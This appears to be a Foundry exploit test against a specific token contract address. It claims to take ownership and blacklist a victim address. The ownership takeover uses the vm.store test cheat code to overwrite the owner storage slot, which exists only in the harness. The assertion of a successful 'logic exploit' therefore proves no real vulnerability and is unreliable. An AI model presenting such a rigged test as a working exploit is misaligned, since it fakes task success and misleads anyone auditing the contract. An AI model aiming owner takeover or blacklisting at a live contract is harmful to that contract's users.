// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITokenTool {
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
    function _isBlacklisted(address) external view returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Define a victim address
        address victim = address(0x1234567890123456789012345678901234567890);

        // First, become the owner by overwriting storage slot 0
        // _owner is at slot 0 in Ownable contract
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Now we are the owner, call multipleBotlistAddress to blacklist the victim
        address[] memory addresses = new address[](1);
        addresses[0] = victim;

        // Create interface to call the function
        ITokenTool targetContract = ITokenTool(TARGET);
        targetContract.multipleBotlistAddress(addresses, true);

        // Verify the victim is now blacklisted
        bool isBlacklisted = targetContract._isBlacklisted(victim);
        require(isBlacklisted, "Victim should be blacklisted");
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
